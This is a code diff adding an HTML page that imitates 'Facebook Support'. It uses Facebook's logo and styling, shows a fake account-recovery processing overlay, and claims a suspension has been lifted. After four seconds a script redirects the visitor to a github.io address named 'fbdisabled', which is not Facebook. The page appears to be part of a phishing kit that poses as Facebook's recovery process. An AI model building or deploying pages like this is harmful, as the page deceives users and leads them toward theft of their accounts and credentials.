@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook Support</title>
+    <style>
+        /* --- General Settings --- */
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5; 
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            box-sizing: border-box;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* --- PROCESSING OVERLAY (New Logic) --- */
+        #processing-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            /* Safed rang 85% opacity ke sath, taaki piche ka thoda dikhe */
+            background-color: rgba(255, 255, 255, 0.85); 
+            backdrop-filter: blur(4px); /* Piche ka content dhundhla (blur) ho jayega */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877F2;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        .processing-text {
+            color: #1877F2;
+            font-size: 18px;
+            font-weight: 600;
+            text-align: center;
+            line-height: 1.4;
+        }
+
+        .sub-text {
+            font-size: 14px;
+            color: #65676b;
+            margin-top: 5px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* --- MAIN CONTENT STYLES (Background Layer) --- */
+        #main-content {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            /* Ye piche rahega, overlay ke niche */
+            filter: grayscale(50%); /* Thoda grey effect */
+        }
+
+        .card {
+            background-color: transparent;
+            padding: 20px 10px;
+            width: 100%;
+        }
+
+        .fb-logo {
+            width: 70px;
+            height: 70px;
+            margin-bottom: 15px;
+            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.1));
+        }
+
+        .fb-wordmark {
+            color: #1877F2;
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 40px;
+            display: block;
+            letter-spacing: -0.5px;
+        }
+
+        .success-icon {
+            color: #42b72a;
+            font-size: 70px;
+            margin-bottom: 25px;
+            display: block;
+        }
+
+        h1 {
+            color: #050505;
+            font-size: 24px;
+            font-weight: 700;
+            margin: 0 0 12px 0;
+            line-height: 1.2;
+        }
+
+        p {
+            color: #65676b;
+            font-size: 17px;
+            line-height: 1.5;
+            margin: 0 0 30px 0;
+            padding: 0 10px;
+        }
+
+        .btn {
+            background-color: #1877F2;
+            color: white;
+            border: none;
+            padding: 14px 0;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: 600;
+            width: 100%;
+            display: block;
+            opacity: 0.5; /* Button disabled dikhega kyunki process chal raha hai */
+        }
+
+    </style>
+</head>
+<body>
+
+    <div id="processing-overlay">
+        <div class="spinner"></div>
+        <div class="processing-text">
+            Account Recovery<br>Restore Processing...
+        </div>
+        <div class="sub-text">Please wait while we verify</div>
+    </div>
+
+    <div id="main-content">
+        <div class="card">
+            <svg class="fb-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024">
+                <path fill="#1877F2" d="M1024 512c0-282.77-229.23-512-512-512S0 229.23 0 512c0 255.55 187.23 467.37 432 505.78V660H302V512h130V399.2C432 270.88 508.44 200 625.39 200c56.02 0 114.61 10 114.61 10v126H675.47c-63.6 0-83.47 39.47-83.47 79.92V512h142l-22.7 148H592v357.78C836.77 979.37 1024 767.55 1024 512z"/>
+                <path fill="#ffffff" d="M711.3 660L734 512H592V415.92c0-40.45 19.87-79.92 83.47-79.92H740V210s-58.59-10-114.61-10C508.44 200 432 270.88 432 399.2V512H302v148h130v357.78c26.54 4.16 53.76 6.22 81.39 6.22 26.68 0 52.95-1.93 78.61-5.78V660h89.3z"/>
+            </svg>
+            
+            <span class="fb-wordmark">facebook</span>
+
+            <div class="success-icon">✓</div>
+
+            <h1>Account Access Restored</h1>
+            
+            <p>Your identity has been verified. The 180-day suspension has been lifted.</p>
+            
+            <button class="btn">Go to News Feed</button>
+        </div>
+    </div>
+
+    <script>
+        // Logic: 4 Second wait -> Redirect
+        window.onload = function() {
+            setTimeout(function() {
+                // Redirect link
+                window.location.href = "https://fbdisabled.github.io/suspended/successful_pending";
+            }, 4000); // 4000 milliseconds = 4 seconds
+        };
+    </script>
+
+</body>
+</html>
